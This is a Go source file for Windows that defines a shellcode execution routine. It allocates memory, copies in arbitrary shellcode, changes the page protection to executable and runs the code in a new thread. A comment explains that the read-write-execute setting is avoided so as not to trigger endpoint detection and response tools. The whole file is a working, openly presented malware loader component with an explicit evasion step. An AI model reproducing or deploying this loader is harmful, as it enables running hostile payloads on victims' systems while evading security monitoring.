//go:build windows

package shellcode

import (
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
)

func Execute(shellcode []byte) error {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("ShellCode Execution died")
		}
	}()
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	// https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
	// Copies the contents of a source memory block to a destination memory block, and supports overlapping
	// source and destination memory blocks.
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
	// Creates a thread to execute within the virtual address space of the calling process.
	createThread := kernel32.NewProc("CreateThread")

	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
	// Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process.
	// Memory allocated by this function is automatically initialized to zero.
	/* C++
	LPVOID VirtualAlloc(
	  [in, optional] LPVOID lpAddress,
	  [in]           SIZE_T dwSize,
	  [in]           DWORD  flAllocationType,
	  [in]           DWORD  flProtect
	);
	*/
	address, vErr := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		// https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants
		windows.PAGE_READWRITE,
	)
	if vErr != nil {
		return fmt.Errorf("failed to reserve memory: %v", vErr)
	}

	/* C++
	VOID RtlMoveMemory(
	  _Out_       VOID UNALIGNED *Destination,
	  _In_  const VOID UNALIGNED *Source,
	  _In_        SIZE_T         Length
	);
	*/
	_, _, _ = rtlMoveMemory.Call(
		address,
		(uintptr)(unsafe.Pointer(&shellcode[0])), // pointer to the beginning of the slice
		uintptr(len(shellcode)),
	)

	// https://learn.microsoft.com/en-gb/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
	// Changes the protection on a region of committed pages in the virtual address space of the calling process.
	/* C++
	BOOL VirtualProtect(
	  [in]  LPVOID lpAddress,
	  [in]  SIZE_T dwSize,
	  [in]  DWORD  flNewProtect,
	  [out] PDWORD lpflOldProtect
	);
	*/
	var oldProtect uint32
	if vpErr := windows.VirtualProtect(
		address,
		uintptr(len(shellcode)),
		// https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants
		// Avoid PAGE_EXECUTE_READWRITE (0x40) as will produce a hit on a EDR/EV
		// PAGE_EXECUTE_READ protection is not compatible with encoding as we need write memory
		// access to decode.
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	); vpErr != nil {
		return fmt.Errorf("failed to change virtuall address protection: %v", vpErr)
	}

	/* C++
	HANDLE CreateThread(
	  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	  [in]            SIZE_T                  dwStackSize,
	  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
	  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
	  [in]            DWORD                   dwCreationFlags,
	  [out, optional] LPDWORD                 lpThreadId
	);
	*/

	var thIdentifier uintptr
	thread, _, thErr := createThread.Call(
		0,            // NULL security attributes
		0,            // size of the stack (default executable size)
		address,      // pointer to address of our reserved memory
		uintptr(0),   // pointer to a variable passed to the thread
		0,            // tell to run after creation
		thIdentifier, // pointer to a variable that receives the thread identifier
	)
	// An error is always expected
	if thErr.Error() != "The operation completed successfully." {
		return fmt.Errorf("failed to execute thread: %v", thErr)
	}

	// Wait forever
	_, wErr := windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFF)

	return wErr
}
